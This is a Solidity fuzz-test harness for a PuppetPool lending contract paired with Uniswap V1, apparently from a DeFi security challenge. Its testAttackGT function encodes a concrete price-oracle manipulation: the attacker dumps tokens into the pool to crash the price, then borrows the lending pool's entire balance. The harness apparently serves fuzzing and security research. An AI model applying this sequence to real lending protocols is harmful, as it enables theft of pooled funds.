// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";

import "examples/PuppetPool/UniswapV1.sol";
import "examples/PuppetPool/PuppetPool.sol";

contract PuppetPoolFuzzing is Test {
    address owner;
    address attacker;
    ERC20Basic token;
    UniswapV1 uniswap;
    PuppetPool puppetpool;

    uint256 public attackerInitBalance = 2 ether;
    uint256 public swaperInitBalance = 10 ether;

    uint256 public attackerInitToken = 1000;
    uint256 public swaperInitToken = 10;
    uint256 public puppetpoolInitToken = 100 * attackerInitToken;

    uint256 public requiredToken = puppetpoolInitToken;

    function setUp() public {
        owner = address(this);
        attacker = address(0xdeadbeef);
        vm.deal(attacker, attackerInitBalance);

        token = new ERC20Basic(1000 ether);
        uniswap = new UniswapV1{value: swaperInitBalance}(address(token));
        puppetpool = new PuppetPool(address(token), address(uniswap));

        token.transfer(attacker, attackerInitToken);
        token.transfer(address(uniswap), swaperInitToken);
        token.transfer(address(puppetpool), puppetpoolInitToken);
    }

    function addressSelector(uint256 e) public returns (address) {
        address[5] memory addresses = [
            address(0),
            attacker,
            address(token),
            address(uniswap),
            address(puppetpool)
        ];
        e = bound(e, 0, addresses.length - 1);
        return addresses[e];
    }

    function testAttackGT() public {
        testAttack(3, attackerInitToken, attackerInitToken, 9.99 ether, puppetpoolInitToken, attackerInitBalance);
    }

    function testAttack(
        uint256 e0,
        uint256 v0,
        uint256 v1,
        uint256 v2,
        uint256 v3,
        uint256 v4
    ) public {
        address a0 = addressSelector(e0);
        bool succeed;
        bytes memory call_data;
        vm.startPrank(attacker);

        call_data = abi.encodeWithSignature("approve(address,uint256)", a0, v0);
        (succeed, ) = address(token).call(call_data);
        if (succeed) {
            call_data = abi.encodeWithSignature("swapToken(uint256,uint256)", v1, v2);
            (succeed, ) = address(uniswap).call(call_data);
            if (succeed) {
                call_data = abi.encodeWithSignature("borrow(uint256)", v3);
                (succeed, ) = address(puppetpool).call{value: v4}(call_data);
                if (succeed) {
                    emit log_named_uint("Attacker.tokenBalance: ", token.balanceOf(attacker));
                    assert(token.balanceOf(attacker) < requiredToken);
                }
            }
        }
        vm.stopPrank();
    }
}
